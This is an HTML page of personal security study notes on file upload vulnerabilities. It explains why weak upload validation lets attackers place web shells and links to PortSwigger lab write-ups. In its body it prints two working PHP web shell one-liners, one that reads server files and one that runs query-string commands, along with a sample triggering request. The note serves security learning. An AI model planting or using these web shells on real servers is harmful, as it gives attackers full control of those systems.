<!DOCTYPE html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
<title>_index :: user@cybrealm:~$</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content=" 1f - File Upload Vulnerabilities FUV is when a web server allows to upload files to its filesystem without proper validation - like their name, type, contents or size. Failing to fulfil these could cause an attacker to upload arbitrary and potentially dangerous file instead of image for example - this includes server-side script files that enable RCE.
In some cases, the act of uploading the file in itself can cause damage, in others - it may involve payload over HTTP
" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/" />
<meta property="og:locale" content="en" />
<meta property="og:title" content="_index :: user@cybrealm:~$" />
<meta property="og:description" content=" 1f - File Upload Vulnerabilities FUV is when a web server allows to upload files to its filesystem without proper validation - like their name, type, contents or size. Failing to fulfil these could cause an attacker to upload arbitrary and potentially dangerous file instead of image for example - this includes server-side script files that enable RCE.
In some cases, the act of uploading the file in itself can cause damage, in others - it may involve payload over HTTP
" />
  <meta property="og:type" content="website" />
<meta property="og:url" content="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/" />
<meta property="og:site_name" content="user@cybrealm:~$" />
<meta property="og:image" content="" />
<meta property="og:image:width" content="2048" />
<meta property="og:image:height" content="1024" />
<link rel="shortcut icon" href="" />
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,300;0,400;0,500;1,300;1,400;1,500&family=Roboto+Slab:wght@300;400;500&family=Ubuntu+Mono:ital@0;1&display=swap"
  rel="stylesheet"
/>
<link href="/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/" rel="alternate" type="application/rss+xml" title="user@cybrealm:~$" />
<link rel="stylesheet" href="http://localhost:1313/styles.css" />
</head>

  <body>
    <div class="theme-container">
      <div class="container center">
        <header class="site-header">
<nav class="navbar">
  <div class="navbar__first">
    <ul class="navbar__list borders">
      <li><a href="http://localhost:1313/">Home</a></li>
      <li>
        <button class="theme-toggle transparent"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>
</button>
      </li>
    </ul>
  </div>
  <div class="navbar__separator"></div>
</nav>
</header>
        <main class="site-main">
  <article class="post">
    <header class="post-header"></header>

    <div class="post-content">
        
<h1 id="1f---file-upload-vulnerabilities">
  1f - File Upload Vulnerabilities
  <a href="#1f---file-upload-vulnerabilities" class="hanchor" ariaLabel="Anchor"></a>
</h1>
<p>FUV is when a web server allows to upload files to its filesystem without proper validation - like their name, type, contents or size. Failing to fulfil these could cause an attacker to upload arbitrary and potentially dangerous file instead of image for example - this includes server-side script files that enable RCE.</p>
<p>In some cases, the act of uploading the file in itself can cause damage, in others - it may involve payload over HTTP</p>
<p>Given fairly clear dangers of FUV, developers commonly implement protection mechanisms, however developers also commonly implement what is believed to have robust validation mechanisms that is easily flawed or can be easily bypassed.</p>
<ul>
<li>Blacklisting dangerous file types is not enough - it may not work in case filename is obfuscated</li>
<li>checking file attributes is not enough - file attributes can be easily manipulated</li>
</ul>
<p>From a <em>security perspective</em> the worst case would be if a website allows server-side script uploads such as Python, PHP, Ruby and is configured to run them as code. In this case it is easy to deploy a <em>Web Shell</em>.</p>
<p>Web Shell is a script that allows an attacker to execute arbitrary commands on a remote server by simply sending HTTP requests to the right endpoint.</p>
<p><em>An ability to upload a web shell, effectively leads to full control over the server.</em></p>
<p>following PHP one-liner could be used to read files from the server&rsquo;s filesystem:</p>
<p><code>&lt;?php echo file_get_contents('/path/to/target/file'); ?&gt;</code></p>
<p>Once uploaded, sending a request for this malicious PHP script will return file&rsquo;s contents in the response.</p>
<p>A more versatile web shell version:</p>
<p><code>&lt;?php echo system($_GET['command']); ?&gt;</code></p>
<p>This script allows to pass an arbitrary system command through query parameters as follows:</p>
<p><code>GET /example/exploit.php?command=id HTTP/1.1</code></p>

      <h2>See</h2><div class="post-entries">
    <div class="item"><a href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f4-web-shell-upload-via-extension-blacklist-bypass-portswigger-lab/"><h2>1f4 - Web shell upload via extension blacklist bypass [PortSwigger Lab]</h2></a><p class="post-meta"><span>2024-07-16</span></p></div>
    <div class="item"><a href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/"><h2>1f3 - Web shell upload via Path Traversal [PortSwigger Lab]</h2></a><p class="post-meta"><span>2024-07-09</span></p></div>
    <div class="item"><a href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/"><h2>1f2 - Web shell upload via Content-Type restriction bypass [Portswigger Lab]</h2></a><p class="post-meta"><span>2024-07-06</span></p></div>
    <div class="item"><a href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f1-remote-code-execution-via-web-shell-upload-portswigger-lab/">1f1-remote-code-execution-via-web-shell-upload-portswigger-lab</a></div>
</div>

    </div>

    <footer class="post-footer"></footer>
  </article>
        </main>
        <footer class="site-footer">
<p class="buildinfo">
  <time datetime="2025-11-27 22:10:46 &#43;04">Site built on: 2025-11-27 22:10:46 &#43;04</time>
</p>
<div class="copyright">
  <p></p>
  <nav class="navbar">
    <ul class="navbar__list">
      <li><a href="http://localhost:1313/posts/index.xml">RSS</a></li>
      <li><a href="http://localhost:1313/sitemap.xml">Sitemap</a></li>
    </ul>
  </nav>
</div>
<p class="themeinfo">Powered by <a href="https://gohugo.io">Hugo</a>, using theme <a href="https://manid2.github.io/hugo-xterm/">Hugo Xterm</a>.</p>
</footer>
      </div>
    </div><script type="text/javascript" src="/bundle.js"></script>
</body>
</html>
